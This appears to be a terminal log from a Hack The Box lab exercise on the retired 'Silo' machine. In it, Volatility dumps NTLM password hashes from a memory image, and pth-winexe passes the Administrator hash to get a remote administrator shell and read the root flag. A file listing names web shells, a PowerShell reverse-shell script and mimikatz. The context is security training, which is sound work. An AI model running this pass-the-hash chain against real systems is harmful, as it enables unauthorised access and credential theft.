+.. 0xffffe000060c7940:svchost.exe                    1516    492     16      0 2018-01-05 22:17:19 UTC+0000          
+.. 0xffffe0000325c940:WmiApSrv.exe                    864    492      5      0 2018-01-05 22:17:48 UTC+0000          
+.. 0xffffe00003051940:svchost.exe                    2000    492      5      0 2018-01-05 22:17:27 UTC+0000          
+.. 0xffffe00003077880:TPAutoConnSvc.                 1256    492      8      0 2018-01-05 22:17:27 UTC+0000          
+... 0xffffe0000301c940:TPAutoConnect.                2824   1256      3      0 2018-01-05 22:17:37 UTC+0000          
+.... 0xffffe00003f698c0:conhost.exe                  2832   2824      1      0 2018-01-05 22:17:37 UTC+0000          
+.. 0xffffe00004fe93c0:OraClrAgnt.exe                 1192    492      2      0 2018-01-05 22:17:18 UTC+0000          
+... 0xffffe00004ff0300:agtctl.exe                    1216   1192      0 ------ 2018-01-05 22:17:18 UTC+0000          
+... 0xffffe000060568c0:agtctl.exe                    1348   1192      0 ------ 2018-01-05 22:17:18 UTC+0000          
+... 0xffffe000060767c0:agtctl.exe                    1388   1192      0 ------ 2018-01-05 22:17:18 UTC+0000          
+... 0xffffe00004ff3940:agtctl.exe                    1264   1192      0 ------ 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe00003149080:sppsvc.exe                     2284    492      5      0 2018-01-05 22:17:29 UTC+0000          
+.. 0xffffe00004ffc440:svchost.exe                    1272    492      4      0 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe000060a62c0:ManagementAgen                 1492    492      9      0 2018-01-05 22:17:18 UTC+0000          
+.. 0xffffe00003fb9080:svchost.exe                     764    492     16      0 2018-01-05 22:17:17 UTC+0000          
+. 0xffffe00003ed4080:lsass.exe                        500    404      6      0 2018-01-05 22:17:16 UTC+0000          
+ 0xffffe000034f54c0:csrss.exe                         324    316     10      0 2018-01-05 22:17:15 UTC+0000          
+ 0xffffe00000df34c0:ServerManager.                   2732   2376     24      0 2018-01-05 22:17:35 UTC+0000          
+ 0xffffe00000089940:System                              4      0     84      0 2018-01-05 22:17:14 UTC+0000          
+. 0xffffe00000c9c100:smss.exe                         208      4      3      0 2018-01-05 22:17:14 UTC+0000          
+ 0xffffe000034ec380:csrss.exe                         396    388     10      0 2018-01-05 22:17:16 UTC+0000          
+ 0xffffe00002fee080:winlogon.exe                      448    388      5      0 2018-01-05 22:17:16 UTC+0000          
+. 0xffffe00003f6f680:dwm.exe                          688    448      9      0 2018-01-05 22:17:16 UTC+0000          
+ 0xffffe00004e00680:explorer.exe                     2424   2416     56      0 2018-01-05 22:17:33 UTC+0000          
+. 0xffffe0000136d080:vmtoolsd.exe                    2992   2424      8      0 2018-01-05 22:17:45 UTC+0000          
+. 0xffffe00003203340:DumpIt.exe                      2932   2424      4      0 2018-01-05 22:18:06 UTC+0000          
+.. 0xffffe00003f8c940:conhost.exe                    2764   2932      2      0 2018-01-05 22:18:06 UTC+0000          
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 -plugins=`pwd`/ | grep mimi                                                                                                 
+Volatility Foundation Volatility Framework 2.6           
+Usage: Volatility - A memory forensics analysis platform.                                                         
+
+volatility: error: no such option: -p                    
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 --p
+lugins=`pwd`/ | grep mimi                                                                                         
+Volatility Foundation Volatility Framework 2.6           
+ERROR   : volatility.debug    : You must specify something to do (try -h)                                         
+arjun@broly:~/Documents/HacktheBox/retired/silo$ volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump                                                                                                                    
+Volatility Foundation Volatility Framework 2.6           
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::                               
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                       
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::                                    
+arjun@broly:~/Documents/HacktheBox/retired/silo$ pth-winexe                                                          
+antak.aspx                Invoke-PowerShellTcp.ps1  nmap/                     notes.ctb~                notes.ctb~~~              SILO-20180105-221806.dmp                                                                                 
+cmdasp.aspx               mimikatz.py               notes.ctb                 notes.ctb~~               Oracle issue.txt          SILO-20180105-221806.zip                                                                                 
+arjun@broly:~/Documents/HacktheBox/retired/silo$ pth-winexe --help                                                   
+winexe version 1.1                                        
+This program may be freely redistributed under the terms of the GNU GPLv3                                            
+Usage: winexe [OPTION]... //HOST COMMAND                  
+Options:                                                  
+  -h, --help                                  Display help message                                                   
+  -V, --version                               Display version number                                                 
+  -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username                                               
+  -A, --authentication-file=FILE              Get the credentials from a file                                        
+  -N, --no-pass                               Do not ask for a password                                              
+  -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]                                              
+  -d, --debuglevel=DEBUGLEVEL                 Set debug level                                                        
+      --uninstall                             Uninstall winexe service after remote execution                        
+      --reinstall                             Reinstall winexe service before remote execution                       
+      --system                                Use SYSTEM account                                                     
+      --profile                               Load user profile                                                      
+      --convert                               Try to convert characters between local and remote code-pages          
+      --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)                                                                                                         
+      --runas-file=FILE                       Run as user options defined in a file                                  
+      --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.                                              
+      --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.                                                           
+arjun@broly:~/Documents/HacktheBox/retired/silo$ pth-winexe  -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd                                                                          
+E_md4hash wrapper called.                                 
+HASH PASS: Substituting user supplied NTLM HASH...        
+Microsoft Windows [Version 6.3.9600]                      
+(c) 2013 Microsoft Corporation. All rights reserved.      
+
+C:\Windows\system32>whoami                                
+whoami                                                    
+silo\administrator                                        
+
+C:\Windows\system32>cd C:\User  ^?s^?^?^?^?               
+cd C:\User      s                                         
+The filename, directory name, or volume label syntax is incorrect.                                                   
+
+C:\Windows\system32>cd C:\Users                           
+cd C:\Users                                               
+
+C:\Users>cd Administrator                                 
+cd Administrator                                          
+
+C:\Users\Administrator>cd Desktop                         
+cd Desktop                                                
+
+C:\Users\Administrator\Desktop>type root.txt              
+type root.txt                                             
+cd39ea0af657a495e33bc59c7836faf6                          
+C:\Users\Administrator\Desktop>exit                       
+exit                                                      
+arjun@broly:~/Documents/HacktheBox/retired/silo$ ls       
+ antak.aspx   cmdasp.aspx   Invoke-PowerShellTcp.ps1   mimikatz.py   nmap   notes.ctb   notes.ctb~   notes.ctb~~   notes.ctb~~~  'Oracle issue.txt'   SILO-20180105-221806.dmp   SILO-20180105-221806.zip                                  
+arjun@broly:~/Documents/HacktheBox/retired/silo$          
